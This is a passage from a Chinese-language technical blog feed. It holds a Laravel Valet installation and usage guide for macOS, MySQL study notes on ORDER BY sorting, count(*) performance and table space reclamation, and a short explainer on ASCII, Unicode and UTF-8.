        <content type="html"><![CDATA[<blockquote><p>Valet 是为 Mac 提供的极简主义开发环境，没有 Vagrant ，也无需 <code>/etc/hosts</code> 文件，甚至可以使用本地隧道公开共享你的站点。<br>Laravel Valet 会在你的 Mac 上将 Nginx 设置为随系统启动后台运行，然后使用 DnsMasq ， Valet 将所有的请求代理到 <code>*.test</code> 域名并指向本地安装的站点目录。<br>换句话说，一个速度极快的 Laravel 开发环境仅仅需要占用 7MB 内存。 Valet 并不是想要替代 Vagrant 或者 Homestead，只是提供另外一种选择，更加灵活、方便、以及占用更小的内存。</p></blockquote><a id="more"></a><h2 id="安装-Valet"><a href="#安装-Valet" class="headerlink" title="安装 Valet"></a>安装 Valet</h2><p>正式安装之前，首先更新一下 Homebrew。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew update</span><br></pre></td></tr></table></figure><p>然后安装各版本的 PHP：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">brew install shivammathur/php/php@7.3</span><br><span class="line">brew install shivammathur/php/php@7.2</span><br><span class="line">brew install shivammathur/php/php@7.1</span><br><span class="line">brew install shivammathur/php/php@7.0</span><br><span class="line">brew install shivammathur/php/php@5.6</span><br></pre></td></tr></table></figure><p>这里安装多个版本的目的是，为后续切换版本做准备。</p><p>安装完 PHP 之后，就可以使用 Composer 了，将 Valet 作为全局服务进行安装。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer global require laravel/valet</span><br></pre></td></tr></table></figure><p>安装完 Valet 之后，还不能直接使用，需要安装 Valet 所依赖的服务（DnsMasq）。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">valet install</span><br></pre></td></tr></table></figure><p>直到上一步完成，整个安装过程终于结束了。</p><p>为了验证是否安装成功，可以 ping 一下 <code>*.test</code> 的任意域名，如果可以 ping 通并看到 <code>127.0.0.1</code>，则表示服务正常。</p><p><img src="inkdrop://file:mR3T8g8CN" alt="clipboard.png"></p><h2 id="站点维护"><a href="#站点维护" class="headerlink" title="站点维护"></a>站点维护</h2><p>使用 Valet 创建一个站点有两种方式：</p><ul><li>valet link</li><li>valet park</li></ul><p>上面两个命令都可以创建一个站点，<code>valet park</code> 算是 <code>valet link</code> 命令的升级版，可以一次创建 N 各站点。</p><h3 id="valet-link"><a href="#valet-link" class="headerlink" title="valet link"></a>valet link</h3><p>快速创建一个站点：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cd /Users/boo/.config/valet/Sites/localhost 进入项目跟路径</span></span><br><span class="line">$ valet link localhost</span><br><span class="line">A [localhost] symbolic link has been created <span class="keyword">in</span> [/Users/boo/.config/valet/Sites/localhost].</span><br></pre></td></tr></table></figure><p>只需要一个命令，一个站点就创建好了：</p><p><img src="inkdrop://file:pVFYCu5RW" alt="clipboard.png"></p><p>查看站点列表：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ valet links</span><br><span class="line">+-----------------------+-----+-----------------------------------+-----------------------------------------------------------------------+</span><br><span class="line">| Site                  | SSL | URL                               | Path                                                                  |</span><br><span class="line">+-----------------------+-----+-----------------------------------+-----------------------------------------------------------------------+</span><br><span class="line">| localhost       |     | http://localhost.test       | /Users/boo/Projects/localhost</span><br><span class="line">| +-----------------------+-----+-----------------------------------+-----------------------------------------------------------------------+</span><br></pre></td></tr></table></figure><p>删除一个站点：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ valet unlink localhost</span><br></pre></td></tr></table></figure><h3 id="valet-park"><a href="#valet-park" class="headerlink" title="valet park"></a>valet park</h3><p>当某个目录下面有多个项目需要创建站点时，使用 <code>valet park</code> 尤为方便。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cd /Users/boo/Sites 进入项目跟路径</span></span><br><span class="line">$ valet park</span><br><span class="line">This directory has been added to Valet<span class="string">'s paths.</span></span><br></pre></td></tr></table></figure><p>使用 <code>valet parked</code> 命令可以查看所有使用 park 添加的站点：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">valet parked</span><br><span class="line">+-----------+-----+-----------------------+----------------------------+</span><br><span class="line">| Site      | SSL | URL                   | Path                       |</span><br><span class="line">+-----------+-----+-----------------------+----------------------------+</span><br><span class="line">| blog      |     | http://blog.test      | /Users/boo/Sites/blog      |</span><br><span class="line">| localhost |     | http://localhost.test | /Users/boo/Sites/localhost |</span><br><span class="line">| phpinfo   |     | http://phpinfo.test   | /Users/boo/Sites/phpinfo   |</span><br><span class="line">+-----------+-----+-----------------------+----------------------------+</span><br></pre></td></tr></table></figure><p>如果想把某个目录下面的所有站点都移除，可以使用 <code>valet forget</code> 命令，然后前提是这些站点都是使用 park 方式添加的。</p><p><code>valet paths</code> 命令则是用来查看所有使用 <code>valet park</code> 添加站点的跟路径。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">valet paths</span><br><span class="line">[</span><br><span class="line">    <span class="string">"/Users/boo/.config/valet/Sites"</span>,</span><br><span class="line">    <span class="string">"/Users/boo/Sites"</span>,</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h2 id="切换版本"><a href="#切换版本" class="headerlink" title="切换版本"></a>切换版本</h2><p>Valet 切换 PHP 版本非常方便，因为前面已经安装好了多版本的 PHP，所以可以直接使用下面的命令进行切换：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">valet use php@7.3</span><br></pre></td></tr></table></figure><h2 id="其他命令"><a href="#其他命令" class="headerlink" title="其他命令"></a>其他命令</h2><p>Valet 常用命令</p><table><thead><tr><th>命令</th><th>描述</th></tr></thead><tbody><tr><td>valet log</td><td>从 Valet 的服务中查看日志</td></tr><tr><td>valet restart</td><td>重启 Valet 守护进程</td></tr><tr><td>valet start</td><td>开启 Valet 守护进程</td></tr><tr><td>valet stop</td><td>停止 Valet 守护进程</td></tr><tr><td>valet trust</td><td>为 Brew 和 Valet 添加文件修改权限使 Valet 输入命令的时候不需要输入密码</td></tr><tr><td>valet uninstall</td><td>完成卸载 Valet 守护进程</td></tr><tr><td>valet use <a href="mailto:php@7.2">php@7.2</a></td><td>切换PHP 版本</td></tr><tr><td>valet tld app</td><td>切换顶级域名</td></tr></tbody></table><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://laravel.com/docs/9.x/valet#installation" target="_blank" rel="noopener">Laravel Valet</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
          <category> Mac </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Mac </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>16 order by是怎么工作的</title>
      <link href="/how-does-order-by-work/"/>
      <url>/how-does-order-by-work/</url>
      
        <content type="html"><![CDATA[<p>本文是基于 <a href="https://time.geekbang.org/column/intro/100020801" target="_blank" rel="noopener">极客时间——MySQL 实战 45 讲</a> 整理的学习笔记，仅供学习参考，请勿用于商业用途，如若侵权，请联系并删除。</p><p>课程重点：</p><ul><li>了解MySQL 里面 order by 语句的几种算法流程</li><li>了解几者之间的区别</li></ul><a id="more"></a><h2 id="全字段排序"><a href="#全字段排序" class="headerlink" title="全字段排序"></a>全字段排序</h2><p>从前面的内容中了解到了，为了避免全表扫猫，会在相关的字段上增加索引。</p><p>假设有一张这样的表：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE &#96;t&#96; (</span><br><span class="line">  &#96;id&#96; int(11) NOT NULL,</span><br><span class="line">  &#96;city&#96; varchar(16) NOT NULL,</span><br><span class="line">  &#96;name&#96; varchar(16) NOT NULL,</span><br><span class="line">  &#96;age&#96; int(11) NOT NULL,</span><br><span class="line">  &#96;addr&#96; varchar(128) DEFAULT NULL,</span><br><span class="line">  PRIMARY KEY (&#96;id&#96;),</span><br><span class="line">  KEY &#96;city&#96; (&#96;city&#96;)</span><br><span class="line">) ENGINE&#x3D;InnoDB;</span><br></pre></td></tr></table></figure><p>对于下面这个语句，索引在 city 字段上面，我们用 explain 命令来看看这个语句的执行情况。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select city,name,age from t where city&#x3D;&#39;杭州&#39; order by name limit 1000;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220704205956.png" alt=""><br>Extra 这个字段中的“Using filesort”表示的就是需要排序，MySQL 会给每个线程分配一块内存用于排序，称为 sort_buffer。</p><p>为了说明这个 SQL 查询语句的执行过程，先来看一下 city 这个索引的示意图。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220704210012.png" alt=""><br>从图中可以看到，满足 city=’杭州’条件的行，是从 ID_X 到 ID_(X+N) 的这些记录。</p><p>通常情况下，这个语句执行流程如下所示 ：</p><ol><li>初始化 sort_buffer，确定放入 name、city、age 这三个字段</li><li>从索引 city 查找第一个满足 city=”杭州” 这个条件的主键 id，也就是图中的 ID_X</li><li>到主键 ID 索引取出整行，取 name、city、age 三个字段的值，存入 sort_buffer 中</li><li>从索引 city 查找下一个满足条件的主键 ID</li><li>重复步骤三、步骤四，直到 city 的值不满足查询条件为止，对应的主键 id 也就是图中的 ID_Y</li><li>对 sort_buffer 中的数据按照字段 name 做快速排序</li><li>按照排序结果取前 1000 行返回给客户端</li></ol><p>暂且把这个排序过程，称为全字段排序，执行流程的示意图如下所示，下一篇文章中我们还会用到这个排序。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220704210038.png" alt=""></p><p>图中“按 name 排序”这个动作，可能在内存中完成，也可能需要使用外部排序，这取决于排序所需的内存和参数 sort_buffer_size。</p><p>sort_buffer_size，就是 MySQL 为排序开辟的内存（sort_buffer）的大小。如果要排序的数据量小于 sort_buffer_size，排序就在内存中完成。但如果排序数据量太大，内存放不下，则不得不利用磁盘临时文件辅助排序。</p><h2 id="rowid-排序"><a href="#rowid-排序" class="headerlink" title="rowid 排序"></a>rowid 排序</h2><p>在上面这个算法过程里面，只对原表的数据读了一遍，剩下的操作都是在 sort_buffer 和临时文件中执行的。但这个算法有一个问题，就是如果查询要返回的字段很多的话，那么 sort_buffer 里面要放的字段数太多，这样内存里能够同时放下的行数很少，要分成很多个临时文件，排序的性能会很差。</p><p>所以如果单行很大，这个方法效率不够好，</p><p>新的算法放入 sort_buffer 的字段，只有要排序的列（即 name 字段）和主键 id。</p><p>但这时，排序的结果就因为少了 city 和 age 字段的值，不能直接返回了，整个执行流程就变成如下所示的样子：</p><ol><li>初始化 sort_buffer，确定放入两个字段，即 name 和 id</li><li>从索引 city 找到第一个满足 city=’杭州’条件的主键 id，也就是图中的 ID_X</li><li>到主键 id 索引取出整行，取 name、id 这两个字段，存入 sort_buffer 中</li><li>从索引 city 取下一个记录的主键 id</li><li>重复步骤 3、4 直到不满足 city=’杭州’条件为止，也就是图中的 ID_Y</li><li>对 sort_buffer 中的数据按照字段 name 进行排序</li><li>遍历排序结果，取前 1000 行，并按照 id 的值回到原表中取出 city、name 和 age 三个字段返回给客户端</li></ol><p>这个执行流程的示意图如下，暂且把这个排序过程，称为 rowid 排序</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220704210130.png" alt=""><br>对比上面的全字段排序流程图可以发现，rowid 排序多访问了一次表 t 的主键索引，也就是步骤 7。</p><h2 id="全字段排序-VS-rowid-排序"><a href="#全字段排序-VS-rowid-排序" class="headerlink" title="全字段排序 VS rowid 排序"></a>全字段排序 VS rowid 排序</h2><p>两种排序方式的区别：</p><ul><li>如果 MySQL 实在是担心排序内存太小，会影响排序效率，才会采用 rowid 排序算法，这样排序过程中一次可以排序更多行，但是需要再回到原表去取数据。</li><li>如果 MySQL 认为内存足够大，会优先选择全字段排序，把需要的字段都放到 sort_buffer 中，这样排序后就会直接从内存里面返回查询结果了，不用再回到原表去取数据。</li></ul><p>这也就体现了 MySQL 的一个设计思想：<strong>如果内存够，就要多利用内存，尽量减少磁盘访问</strong>。</p><p>对于 InnoDB 表来说，rowid 排序会要求回表多造成磁盘读，因此不会被优先选择。</p><p>其实并不是所有的 order by 语句，都需要排序操作的。</p><p>从上面分析的执行过程，我们可以看到，MySQL 之所以需要生成临时表，并且在临时表上做排序操作，<strong>其原因是原来的数据都是无序的</strong>。</p><p>也就是说如果能够保证从索引上取出来的行，天然就是按某个顺序（递增或者递减）排列的话，那就可以不用再排序了。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>Mysql 的设计思想：如果内存够，就要多利用内存，尽量减少磁盘访问</li><li>在 Mysql 中做排序，是一个成本比较高的操作，但也不是所有 order by 都需要排序，只有数据是无序的时候，才会生成临时表，并在临时表上面进行排序</li><li>InnoDB 有两种排序方式：全字段排序和rowid 排序，rowid 排序会要求回表多造成磁盘读，通常不会被优先选择</li></ul>]]></content>
      
      
      <categories>
          
          <category> Mysql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>字符编码笔记：ASCII，Unicode 和 UTF-8</title>
      <link href="/ascii-unicode-and-utf-8/"/>
      <url>/ascii-unicode-and-utf-8/</url>
      
        <content type="html"><![CDATA[<p>不得不知道的字符编码的知识。</p><a id="more"></a><h2 id="ASCII-码"><a href="#ASCII-码" class="headerlink" title="ASCII 码"></a>ASCII 码</h2><p>所谓ASCII 码，就是一套字符编码，它规定了英文中的各种字符在计算机里表示形式。</p><p>ASCII 码一共规定了128个字符的编码，例如字母 a 的二进制编码是<code>0110 0001</code>，把这个二进制转成十进制就是97。</p><p>所以字母 a 在ASCII 码表中对应的 ASCII值就是 97。</p><p>如果仔细思考一下，就会发现一个严重的问题，ASCII 码仅仅只是对英文字符进行编码。</p><p>可问题是，并不是所有国家的语言都是使用英文，于是，各个国家便有了自己的字符集。</p><blockquote><p>什么是字符集？</p></blockquote><p>字符集就是一个系统支持的所有抽象字符的集合，字符集说到底，它约定了不同字符在二进制上的表现形式。</p><p>常见的字符集：</p><ul><li>ASCII（美国）：最基本的字符集，涵盖了所有的英文字母和一些常用的字符</li><li>GB2312（中国）：中国的字符集，加入了大概6000 个汉字</li><li>GBK（中国）：GB2312 的扩展</li><li>…</li></ul><p>可是新的问题又来了，如果放任各个国家使用自己的字符集就乱套了。</p><p>此时，如果能出现一个统一所有字符的字符集就好了，它收录了世界各国的文字，任何一个字符都可以在其中找到对应 的编码。</p><h2 id="Unicode"><a href="#Unicode" class="headerlink" title="Unicode"></a>Unicode</h2><p>于是 Unicode 便诞生了。</p><p>它的出现解决了字符集大统一的问题，涵盖了各个国家的字符集，这就是 Unicode 字符集。</p><p>那么新的问题也随之而来了。<br>Unicode 只是一个字符集，它规定了不同的字符在二进制上的表示形式。</p><p>比如 “中” 这个汉字，它的 Unicode 编码是 <code>\u4e2d</code>，<code>4e2d</code> 是 十六进制，转换成十进制是 20013，转换成二进制是 <code>01001110 00101101</code>，这一个汉字，至少需要两个字节来存储。</p><p>问题就在于，Unicode 只是规定了这些字符对应的二进制值，但是并没有规定这些二进制值该如何存储。</p><p>这个汉字两个字节就能存储，但有些字符需要三个字节，甚至四个。<br>像 a 这种字符，以前用 ASCII 码的时候，用一个字节就能表示，但是在 Unicode 里如果采用两个字节或三个的固定长度编码，不仅空间利用率很差，同时与采用一个字节编码的 ASCII 字符集也无法兼容。</p><h2 id="UTF-8"><a href="#UTF-8" class="headerlink" title="UTF-8"></a>UTF-8</h2><p>针对这些问题，UTF-8 编码方案便诞生了。</p><p>它是 Unicode 的一种实现，它只取了 Unicode 中最常用的一部分，通过可变长度编码方式来存储。<br>这样一来，既解决了Unicode 的编码问题，也尽可能地节约了空间。</p><p>对于ASCII 码表里的字符仍然用一个字节来存储，而一个汉字用三个字节来存储。</p><h2 id="三者的关系"><a href="#三者的关系" class="headerlink" title="三者的关系"></a>三者的关系</h2><p>ASCII：一个字符集（一套字符编码），规定了 128 个字符的编码 <br>Unicode：同样是一个字符集（一套字符编码），只不过它更大更完整，收录了世界各国的文字，任何一个字符都可以在其中找到对应 Unicode 编码 <br>UTF-8：一种编码方案（是 Unicode 的实现），通过可变长的编码方式，解决不同字节大小的存储问题</p><h2 id="乱码是如何产生的"><a href="#乱码是如何产生的" class="headerlink" title="乱码是如何产生的"></a>乱码是如何产生的</h2><p>在回答这个问题之前，首先来看看什么是编码和解码。</p><p>编码：将正常的字符选择任意类型的编码方式，转换为对应的二进制值，这个过程就是编码。无论使用哪一种编码方式进行编码，最终都是变成计算机的二进制值。</p><p>解码：一串二进制值，使用一种编码方式，转换成的对应的字符，这个过程称为解码。</p><p>解码时，可以使用任意的编码方式进行解码，但是往往只有一种编码方式可以显示正常，其他编码方式解出来的字符则都会是乱码。</p><p>但是这种有一个问题需要注意：<br>编码规范的字库表里面不包含目标字符，那就无法在字符集中找到对应的二进制值，这就会导致不可逆的乱码。</p><p>举个例子就是：ISO-8859-1 不包含中文字符，如果选择这种编码方式对中文字符进行编码，那么就算最终使用同样的编码方式进行解码，看到的始终都是乱码。</p><p>乱码说白了就是<strong>编码和解码使用的编码方式不一致导致的问题（当然，还有字库表不包含目标字符时也会出现）。</strong></p>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>14 count(*)这么慢，我该怎么办</title>
      <link href="/count-is-so-slow-what-should-i-do/"/>
      <url>/count-is-so-slow-what-should-i-do/</url>
      
        <content type="html"><![CDATA[<p>本文是基于 <a href="https://time.geekbang.org/column/intro/100020801" target="_blank" rel="noopener">极客时间——MySQL 实战 45 讲</a> 整理的学习笔记，仅供学习参考，请勿用于商业用途，如若侵权，请联系并删除。</p><p>课程重点：</p><ul><li>了解 count(*) 的实现方式</li><li>了解常用的统计计数的方案以及各自的优劣势</li><li>知道 <code>count(*)</code>、<code>count(id)</code>、<code>count(1)</code> 这几者的差别</li></ul><a id="more"></a><h2 id="count-的实现方式"><a href="#count-的实现方式" class="headerlink" title="count(*) 的实现方式"></a>count(*) 的实现方式</h2><p>首先要明确的是，在不同的 MySQL 引擎中，count(*) 有不同的实现方式。</p><ul><li>MyISAM 引擎把一个表的总行数存在了磁盘上，因此执行 count(*) 的时候会直接返回这个数，效率很高</li><li>而 InnoDB 引擎就麻烦了，它执行 count(*) 的时候，需要把数据一行一行地从引擎里面读出来，然后累积计数</li></ul><p>那为什么 <strong>InnoDB 不跟 MyISAM 一样，也把数字存起来呢</strong>？</p><p>这是因为即使是在同一个时刻的多个查询，由于多版本并发控制（MVCC）的原因，InnoDB 表“应该返回多少行”也是不确定的。</p><p>InnoDB 是索引组织表，主键索引树的叶子节点是数据，而普通索引树的叶子节点是主键值。</p><p>所以，普通索引树比主键索引树小很多。对于 count(<em>) 这样的操作，遍历哪个索引树得到的结果逻辑上都是一样的。因此，MySQL 优化器会找到最小的那棵树来遍历。*</em>在保证逻辑正确的前提下，尽量减少扫描的数据量，是数据库系统设计的通用法则之一**。</p><p>如果你用过 <code>show table status</code> 命令的话，就会发现这个命令的输出结果里面也有一个 TABLE_ROWS 用于显示这个表当前有多少行，这个命令执行挺快的，那这个 TABLE_ROWS 能代替 count(*) 吗？</p><p>答案是不可以的。</p><p>TABLE_ROWS 就是从这个采样估算得来的，因此它也很不准。有多不准呢，官方文档说误差可能达到 40% 到 50%。所以，show table status 命令显示的行数也不能直接使用。</p><p>小结一下：</p><ul><li>MyISAM 表虽然 count(*) 很快，但是不支持事务；</li><li>show table status 命令虽然返回很快，但是不准确；</li><li>InnoDB 表直接 count(*) 会遍历全表，虽然结果准确，但会导致性能问题。</li></ul><p>回到文章开头的问题，如果你现在有一个页面经常要显示交易系统的操作记录总数，到底应该怎么办呢？答案是，我们只能自己计数。</p><p>计数思路：找一个地方，把操作记录表的行数存起来。</p><h2 id="用缓存系统保存计数"><a href="#用缓存系统保存计数" class="headerlink" title="用缓存系统保存计数"></a>用缓存系统保存计数</h2><p>对于更新很频繁的库来说，第一时间想到的就是缓存了。</p><p>可以使用 Redis 将表的总行数保存下来，这个表每被插入一行 Redis 计数就加 1，每被删除一行 Redis 计数就减 1。</p><p>这种方式下，读和更新操作都很快，可是，这是否就是完美的解决方案呢？</p><p>不是的，因为缓存可能会丢失。Redis 的数据不能永久地留在内存里，Redis 可能会异常重启。</p><p>另外就是将计数保存在缓存系统中的方式，还不只是丢失更新的问题。即使 Redis 正常工作，这个值还是逻辑上不精确的。</p><p>这里说的不精确是这么定义的：</p><ol><li>一种是，查到的 100 行结果里面有最新插入记录，而 Redis 的计数里还没加 1</li><li>另一种是，查到的 100 行结果里没有最新插入的记录，而 Redis 的计数里已经加了 1</li></ol><h2 id="在数据库保存计数"><a href="#在数据库保存计数" class="headerlink" title="在数据库保存计数"></a>在数据库保存计数</h2><p>如果把这个计数直接放到数据库里单独的一张计数表中，就可以很好地解决上面的两个问题。</p><p>只是这个方案相比上一个方案，在查询速度上面，前者更快一些。</p><h2 id="不同的-count-用法"><a href="#不同的-count-用法" class="headerlink" title="不同的 count 用法"></a>不同的 count 用法</h2><p>经常会遇到一个问题：在 select count(?) from t 这样的查询语句里面，count(*)、count(主键 id)、count(字段) 和 count(1) 等不同用法的性能，有哪些差别？</p><p>首先需要弄清楚 count() 的语义。count() 是一个聚合函数，对于返回的结果集，一行行地判断，如果 count 函数的参数不是 NULL，累计值就加 1，否则不加。最后返回累计值。</p><p>所以，count(*)、count(主键 id) 和 count(1) 都表示返回满足条件的结果集的总行数；而 count(字段），则表示返回满足条件的数据行里面，参数“字段”不为 NULL 的总个数。</p><p>至于分析性能差别的时候，你可以记住这么几个原则：</p><ul><li>server 层要什么就给什么</li><li>InnoDB 只给必要的值</li><li>现在的优化器只优化了 count(*) 的语义为“取行数”，其他“显而易见”的优化并没有做</li></ul><p><strong>对于 count(主键 id) 来说</strong>，InnoDB 引擎会遍历整张表，把每一行的 id 值都取出来，返回给 server 层。server 层拿到 id 后，判断是不可能为空的，就按行累加。</p><p><strong>对于 count(1) 来说</strong>，InnoDB 引擎遍历整张表，但不取值。server 层对于返回的每一行，放一个数字“1”进去，判断是不可能为空的，按行累加。</p><p>单看这两个用法的差别的话，你能对比出来，count(1) 执行得要比 count(主键 id) 快。因为从引擎返回 id 会涉及到解析数据行，以及拷贝字段值的操作。</p><p><strong>对于 count(字段) 来说</strong>：</p><ol><li>如果这个“字段”是定义为 not null 的话，一行行地从记录里面读出这个字段，判断不能为 null，按行累加；</li><li>如果这个“字段”定义允许为 null，那么执行的时候，判断到有可能是 null，还要把值取出来再判断一下，不是 null 才累加。</li></ol><p>也就是前面的第一条原则，server 层要什么字段，InnoDB 就返回什么字段。</p><p><strong>但是 count(*) 是例外</strong>，并不会把全部字段取出来，而是专门做了优化，不取值。count(*) 肯定不是 null，按行累加。</p><p>看到这里，你一定会说，优化器就不能自己判断一下吗，主键 id 肯定非空啊，为什么不能按照 count(*) 来处理，多么简单的优化啊。</p><p>当然，MySQL 专门针对这个语句进行优化，也不是不可以。但是这种需要专门优化的情况太多了，而且 MySQL 已经优化过 count(*) 了，你直接使用这种用法就可以了。</p><p>所以结论是：按照效率排序的话，count(字段)&lt;count(主键 id)&lt;count(1)≈<code>count(*)</code>，所以我建议你，尽量使用 <code>count(*)</code>。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>按照效率排序的话，count(字段)&lt;count(主键 id)&lt;count(1)≈<code>count(*)</code>，建议使用 <code>count(*)</code></li></ul>]]></content>
      
      
      <categories>
          
          <category> Mysql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>13 为什么表数据删掉一半，表文件大小不变</title>
      <link href="/why-is-half-of-the-table-data-deleted-but-the-table-file-size-remains-the-same/"/>
      <url>/why-is-half-of-the-table-data-deleted-but-the-table-file-size-remains-the-same/</url>
      
        <content type="html"><![CDATA[<p>本文是基于 <a href="https://time.geekbang.org/column/intro/100020801" target="_blank" rel="noopener">极客时间——MySQL 实战 45 讲</a> 整理的学习笔记，仅供学习参考，请勿用于商业用途，如若侵权，请联系并删除。</p><p>课程重点：</p><ul><li>了解 Mysql 的innodb_file_per_table 参数</li><li>了解 Mysql 数据删除流程</li><li>区分 Online 和 Inplace</li></ul><a id="more"></a><h2 id="参数-innodb-file-per-table"><a href="#参数-innodb-file-per-table" class="headerlink" title="参数 innodb_file_per_table"></a>参数 innodb_file_per_table</h2><p>表数据既可以存在共享表空间里，也可以是单独的文件。这个行为是由参数 innodb_file_per_table 控制的：</p><ol><li>这个参数设置为 OFF 表示的是，表的数据放在系统共享表空间，也就是跟数据字典放在一起</li><li>这个参数设置为 ON 表示的是，每个 InnoDB 表数据存储在一个以 .ibd 为后缀的文件中</li></ol><p>从 MySQL 5.6.6 版本开始，它的默认值就是 ON 了。</p><p>建议不论使用 MySQL 的哪个版本，都将这个值设置为 ON。</p><p>因为，一个表单独存储为一个文件更容易管理，而且在你不需要这个表的时候，通过 <code>drop table</code> 命令，系统就会直接删除这个文件。而如果是放在共享表空间中，即使表删掉了，空间也是不会回收的。</p><h2 id="数据删除流程"><a href="#数据删除流程" class="headerlink" title="数据删除流程"></a>数据删除流程</h2><p>B + 树索引示意图：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220623222553.png" alt=""></p><p>假设，我们要删掉 R4 这个记录，InnoDB 引擎只会把 R4 这个记录标记为删除。如果之后要再插入一个 ID 在 300 和 600 之间的记录时，可能会复用这个位置。但是，磁盘文件的大小并不会缩小。</p><p>在 InnoBD 中，数据是按页进行存储的，如果我们删掉了一个数据页上的所有记录，会怎么样？</p><p>答案是，整个数据页就可以被复用了。</p><p>但是，<strong>数据页的复用跟记录的复用是不同的</strong>。</p><p><strong>记录的复用，只限于符合范围条件的数据</strong>。比如上面的这个例子，R4 这条记录被删除后，如果插入一个 ID 是 400 的行，可以直接复用这个空间。但如果插入的是一个 ID 是 800 的行，就不能复用这个位置了。</p><p><strong>数据页的复用</strong>，当整个页从 B+ 树里面摘掉以后，可以复用到任何位置。以上图为例，如果将数据页 page A 上的所有记录删除以后，page A 会被标记为可复用。这时候如果要插入一条 ID=50 的记录需要使用新页的时候，page A 是可以被复用的。</p><p>如果相邻的两个数据页利用率都很小，系统就会把这两个页上的数据合到其中一个页上，另外一个数据页就被标记为可复用。</p><p>进一步地，如果我们用 delete 命令把整个表的数据删除呢？结果就是，所有的数据页都会被标记为可复用。但是磁盘上，文件不会变小。</p><p>你现在知道了，delete 命令其实只是把记录的位置，或者数据页标记为了“可复用”，但磁盘文件的大小是不会变的。也就是说，通过 delete 命令是不能回收表空间的。这些可以复用，而没有被使用的空间，看起来就像是“空洞”。</p><p>实际上，<strong>不止是删除数据会造成空洞，插入数据也会</strong>。</p><p>如果数据是按照索引递增顺序插入的，那么索引是紧凑的。但如果数据是随机插入的，就可能造成索引的数据页分裂。</p><p>假设图 1 中 page A 已经满了，这时我要再插入一行数据，会怎样呢？</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220623222611.png" alt=""></p><p>可以看到，由于 page A 满了，再插入一个 ID 是 550 的数据时，就不得不再申请一个新的页面 page B 来保存数据了。页分裂完成后，page A 的末尾就留下了空洞（注意：实际上，可能不止 1 个记录的位置是空洞）。</p><p>另外，更新索引上的值，可以理解为删除一个旧的值，再插入一个新值。不难理解，这也是会造成空洞的。</p><p>也就是说，经过大量增删改的表，都是可能是存在空洞的。所以，如果能够把这些空洞去掉，就能达到收缩表空间的目的。</p><p>而重建表，就可以达到这样的目的。</p><h2 id="重建表"><a href="#重建表" class="headerlink" title="重建表"></a>重建表</h2><p>可以新建一个与表 A 结构相同的表 B，然后按照主键 ID 递增的顺序，把数据一行一行地从表 A 里读出来再插入到表 B 中。</p><p>由于表 B 是新建的表，所以表 A 主键索引上的空洞，在表 B 中就都不存在了。显然地，表 B 的主键索引更紧凑，数据页的利用率也更高。如果我们把表 B 作为临时表，数据从表 A 导入表 B 的操作完成后，用表 B 替换 A，从效果上看，就起到了收缩表 A 空间的作用。</p><p>可以使用 alter table A engine=InnoDB 命令来重建表。在 MySQL 5.5 